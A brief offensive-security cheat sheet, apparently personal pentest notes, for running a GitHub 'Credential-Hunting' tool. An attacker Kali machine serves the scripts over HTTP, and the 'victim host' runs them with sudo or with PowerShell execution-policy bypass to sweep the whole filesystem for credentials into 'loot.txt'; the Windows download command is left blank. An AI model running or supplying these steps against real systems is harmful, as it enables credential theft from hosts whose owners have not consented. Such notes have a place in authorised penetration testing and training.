https://github.com/NeCr00/Credential-Hunting

## Linux

on KALI ATTACKER
```
cd ~/Desktop/Tools/Credential-Hunting && python -m http.server 80
```

on VICTIM HOST
```
chmod +x credshunter.sh
```

Execute
```
sudo ./credshunter.sh -p / -o loot.txt
```

---

## Windows

on KALI ATTACKER
```
cd ~/Desktop/Tools/Credential-Hunting && python -m http.server 80
```

on VICTIM HOST
```
wget 
```

```powershell
powershell -ep bypass
```

```powershell
.\credshunter.ps1 -Path C:\ -OutputFile loot.txt
```